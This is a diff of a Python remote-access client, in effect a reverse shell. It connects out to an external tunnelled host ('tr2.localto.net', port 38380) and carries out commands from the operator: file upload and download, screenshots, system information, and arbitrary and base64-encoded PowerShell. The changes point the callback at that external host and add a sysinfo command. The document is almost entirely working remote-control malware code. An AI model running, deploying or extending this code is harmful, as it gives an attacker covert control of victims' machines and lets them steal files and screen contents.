@@ -8,8 +8,8 @@ import time
 import platform
 from PIL import Image, ImageGrab
 import io
+from client_info import data_array
 # -------------------------------------------------------------------------------
-
 
 def reliable_send(data):
     json_data = json.dumps(data)
@@ -83,8 +83,10 @@ def socket_create():
         global host
         global port
         global s
-        host = '127.0.0.1'
-        port = 5555
+        host = 'tr2.localto.net'
+        port = 38380
+        # host = '127.0.0.1'
+        # port = 5555
         s = socket.socket()
     except socket.error as msg:
         print("Socket creation error: " + str(msg))
@@ -108,7 +110,7 @@ def socket_connect():
 def receive_commands():
     while True:
         received_command = reliable_receive(s)
-        print(received_command)
+        command_user = received_command[0].lower()
 
         if received_command[0] == 'cd':
             try:
@@ -116,30 +118,34 @@ def receive_commands():
             except:
                 pass
 
-        elif received_command[0] in ['quit', 'exit']:
+        elif command_user in ['quit', 'exit']:
             s.close()
             break
 
-        elif received_command[0] == "upload":
+        elif command_user == "upload":
             file_path = received_command[2]
             file_name = os.path.basename(received_command[1])
 
             file_path = os.path.join(file_path, file_name)
             command_result = write_file(path=file_path, content=received_command[3])
 
-        elif received_command[0] == "run":
+        elif command_user == "run":
             command_result = run_powerShell_script(data=received_command[2])
 
-        elif received_command[0] == "download":
+        elif command_user == "download":
             command_result = read_file(received_command[1])
             
-        elif received_command[0] == "screen-shot":
+        elif command_user == "screen-shot":
             command_result = take_screenshot_and_convert_to_string()
+            
+        elif command_user == "sysinfo":
+            command_result = data_array
 
         else:
             command_result = execute_command(received_command, "-command")
 
-        if received_command[0] == "whoami":
+        # send to server
+        if command_user == "whoami":
             reliable_send(get_system_info())
         else:
             reliable_send([command_result, "[ " + os.getcwd() + " ]>"])
@@ -154,39 +160,21 @@ def run_powerShell_script(data):
         powershell_script = base64.b64decode(data).decode()
         result = execute_command([powershell_script], "")
         return result
-        # desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
-        # file_path = os.path.join(desktop_path, "test.ps1")
-
-        # write_file(path=file_path, content=data)
-        # result = execute_command([file_path], "-file")
-        # os.remove(file_path)
-        # return result
     except Exception as ex:
         return ("[Error] from run powershell script \n" + str(ex))
  
 
 def get_system_info():
     sysInfo = platform.uname()
-    USER = "?"
-    SYSTEM = "?"
-    VERSION = "?"
     try:
-        USER = sysInfo.node
-        SYSTEM = sysInfo.system
-        VERSION = sysInfo.version
+        return [sysInfo.node,sysInfo.system, sysInfo.version]
     except:
-        pass
-
-    return [USER, SYSTEM, VERSION]
+        return ["?", "?", "?"]
 
 # Execute command
-
 def execute_command(received_command, typ_of_command):
     try:
         powerShell_command = ["powershell", f'{typ_of_command}', " ".join(received_command)]
-        print("----------------------------------")
-        # path = os.path.normpath()
-        # print(powerShell_command)
         result = subprocess.run(powerShell_command, capture_output=True, text=True)
 
         if result.returncode == 0:
